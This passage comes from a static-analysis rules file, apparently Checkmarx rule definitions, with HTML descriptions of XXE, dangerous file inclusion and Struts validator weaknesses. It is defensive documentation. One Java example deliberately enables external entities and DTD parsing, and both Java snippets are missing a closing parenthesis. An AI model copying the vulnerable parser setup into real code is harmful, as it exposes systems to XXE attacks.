&lt;li&gt;In particular, disable DTD parsing and resolving of entities. Apply a strict XML schema on the server, and validate the input XML accordingly.&amp;#160;&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div&gt;Specific Recommendations:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;Use safe XML parsers, and disable DTD parsing and entity resolving.&amp;#160;&lt;/li&gt;
&lt;li&gt;Do not enable DTD parsing or entity resolving.&amp;#160;&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Vulnerable XML Parsing with XMLStreamReader&lt;/h4&gt;&lt;pre&gt;String parseXML(InputStream input) {
    StringBuilder content = new StringBuilder();
    
    XMLInputFactory factory = XMLInputFactory.newFactory(); 
    factory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, true);
    factory.setProperty(XMLInputFactory.SUPPORT_DTD, true); 
    
    XMLStreamReader reader = factory.createXMLStreamReader(input);
    
    while(reader.hasNext())
    {
        if(reader.hasText()
        {
            content.append(reader.getText());
        }
        reader.next();
    }
    
    return content.toString();
}
&lt;/pre&gt;&lt;h4&gt;Disabling DTD Entities with XMLStreamReader&lt;/h4&gt;&lt;pre&gt;String parseXML(InputStream input) {
    StringBuilder content = new StringBuilder();
    
    XMLInputFactory factory = XMLInputFactory.newFactory(); 
    factory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
    factory.setProperty(XMLInputFactory.SUPPORT_DTD, false); 
    
    XMLStreamReader reader = factory.createXMLStreamReader(input);
    
    while(reader.hasNext())
    {
        if(reader.hasText()
        {
            content.append(reader.getText());
        }
        reader.next();
    }
    
    return content.toString();
}
&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_2277</key><name>Dangerous_File_Inclusion</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;If an attacker can select the name of the library, or the location of the code file, that is loaded by the application, they would be able to cause the application to execute arbitrary code. This effectively allows the attacker to control the code run by the application.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;The application uses untrusted data to specify the library or code file, without proper sanitization. This causes the application to load any arbitrary code, as specified. The loaded code will then be executed.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ul&gt;
&lt;li&gt;Do not dynamically load code libraries, especially not based on user input.&lt;/li&gt;
&lt;li&gt;If it is necessary to use untrusted data to select the library to be loaded,&amp;nbsp;verify the selected library name matches a predefined&amp;nbsp;set of whitelisted library names. Alternatively, use the value as an identifier to select from the whitelisted libraries.&lt;/li&gt;
&lt;li&gt;Validate any untrusted data used to load or process libraries or code files.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_2338</key><name>Struts2_Duplicate_Validators</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Struts: Duplicate Validation Forms&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;102&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Variant)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Incomplete"&gt;Incomplete&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_102_Description" id="oc_102_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;The application uses multiple validation forms with the same
name, which might cause the Struts Validator to validate a form that the
programmer does not expect.&lt;/div&gt;
&lt;p class="subheading"&gt;Extended Description&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;If two validation forms have the same name, the Struts Validator
arbitrarily chooses one of the forms to use for input validation and
discards the other. This decision might not correspond to the programmer's
expectations, possibly leading to resultant weaknesses. Moreover, it
indicates that the validation logic is not up-to-date, and can indicate that
other, more subtle validation errors are present.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_102_Time of Introduction" id="oc_102_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Implementation&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Applicable Platforms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Applicable Platforms&lt;/div&gt;&lt;div name="oc_102_Applicable Platforms" id="oc_102_Applicable Platforms" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Languages&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;Java&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Common Consequences"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Common Consequences&lt;/div&gt;&lt;div name="oc_102_Common Consequences" id="oc_102_Common Consequences" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Scope&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Effect&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Confidentiality&lt;/div&gt;&lt;div style="font-size:90%;"&gt;Integrity&lt;/div&gt;&lt;div style="font-size:90%;"&gt;Availability&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p&gt;If a J2EE application interfaces with native code that does not
perform array bounds checking, an attacker may be able to use an input
validation mistake in the J2EE application to launch a buffer overflow
attack.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Demonstrative Examples"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Demonstrative Examples&lt;/div&gt;&lt;div name="oc_102_Demonstrative Examples" id="oc_102_Demonstrative Examples" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="subheading"&gt;Example 1&lt;/p&gt;&lt;p&gt;Two validation forms with the same name.&lt;/p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;XML&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;&amp;lt;form-validation&amp;gt;&lt;/div&gt;&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;&amp;lt;formset&amp;gt;&lt;/div&gt;
&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;&amp;lt;form name="ProjectForm"&amp;gt; ...
&amp;lt;/form&amp;gt;&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;&amp;lt;form name="ProjectForm"&amp;gt; ...
&amp;lt;/form&amp;gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;&amp;lt;/formset&amp;gt;&lt;/div&gt;
&lt;/div&gt;&lt;div style="font-size:90%;"&gt;&amp;lt;/form-validation&amp;gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;It is critically important that validation logic be maintained and
kept in sync with the rest of the application.&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_102_Potential Mitigations" id="oc_102_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Implementation&lt;/p&gt;&lt;p&gt;The DTD or schema validation will not catch the duplicate occurrence
of the same form name. To find the issue in the implementation, manual
checks or automated static analysis could be applied to the xml
configuration files.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Background Details"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Background Details&lt;/div&gt;&lt;div name="oc_102_Background Details" id="oc_102_Background Details" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Unchecked input is the root cause of some of today's worst and most common
software security problems. Cross-site scripting, SQL injection, and process
control vulnerabilities can all stem from incomplete or absent input
validation. &lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Weakness Ordinalities"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Weakness Ordinalities&lt;/div&gt;&lt;div name="oc_102_Weakness Ordinalities" id="oc_102_Weakness Ordinalities" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Ordinality&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Description&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Primary&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div style="font-size:90%; font-style:italic; padding:5px;"&gt;(where
the weakness exists independent of other weaknesses)&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_102_Relationships" id="oc_102_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;20&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=20" target="_blank"&gt;Improper Input Validation&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Seven Pernicious Kingdoms &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;700&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;101&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=101" target="_blank"&gt;Struts Validation Problems&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;694&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=694" target="_blank"&gt;Use of Multiple Resources with Duplicate Identifier&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;722&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=722" target="_blank"&gt;OWASP Top Ten 2004 Category A1 - Unvalidated Input&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses in OWASP Top Ten (2004) &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;711&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;PeerOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;675&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=675" target="_blank"&gt;Duplicate Operations on Resource&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts&lt;/span&gt;1000&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Causal Nature"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt;&lt;a href="javascript:toggleblocksOC('102_Causal Nature');"&gt;f&lt;/a&gt; &lt;/span&gt;Causal Nature&lt;/div&gt;&lt;div name="oc_102_Causal Nature" id="oc_102_Causal Nature" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="indent"&gt;Explicit&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Taxonomy Mappings"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Taxonomy Mappings&lt;/div&gt;&lt;div name="oc_102_Taxonomy Mappings" id="oc_102_Taxonomy Mappings" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Mapped Taxonomy Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Node ID&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Fit&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Mapped Node Name&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;7 Pernicious Kingdoms&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Struts: Duplicate Validation Forms&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_102_Content History" id="oc_102_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;7 Pernicious Kingdoms&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Eric Dalci&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Demonstrative Example, Potential Mitigations,
Time of Introduction&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Relationships, Other Notes, Taxonomy Mappings,
Weakness Ordinalities&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-10-14&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Description, Other Notes,
Potential Mitigations&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-03-10&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Relationships&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-07-27&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Demonstrative Examples&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-12-28&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Background Details, Common Consequences,
Other Notes&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_2336</key><name>Struts2_Action_Field_Without_Validator</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Struts: Unvalidated Action Form&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;108&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Variant)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Incomplete"&gt;Incomplete&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_108_Description" id="oc_108_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;Every Action Form must have a corresponding validation
form.&lt;/div&gt;
&lt;p class="subheading"&gt;Extended Description&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;If a Struts Action Form Mapping specifies a form, it must have a
validation form defined under the Struts Validator.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_108_Time of Introduction" id="oc_108_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Implementation&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Applicable Platforms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Applicable Platforms&lt;/div&gt;&lt;div name="oc_108_Applicable Platforms" id="oc_108_Applicable Platforms" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Languages&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;Java&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Common Consequences"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Common Consequences&lt;/div&gt;&lt;div name="oc_108_Common Consequences" id="oc_108_Common Consequences" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Scope&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Effect&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p&gt;If an action form mapping does not have a validation form defined, it
may be vulnerable to a number of attacks that rely on unchecked input.
Unchecked input is the root cause of some of today's worst and most
common software security problems. Cross-site scripting, SQL injection,
and process control vulnerabilities all stem from incomplete or absent
input validation.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Confidentiality&lt;/div&gt;&lt;div style="font-size:90%;"&gt;Integrity&lt;/div&gt;&lt;div style="font-size:90%;"&gt;Availability&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p&gt;Although J2EE applications are not generally susceptible to memory
corruption attacks, if a J2EE application interfaces with native code
that does not perform array bounds checking, an attacker may be able to
use an input validation mistake in the J2EE application to launch a
buffer overflow attack.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_108_Potential Mitigations" id="oc_108_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
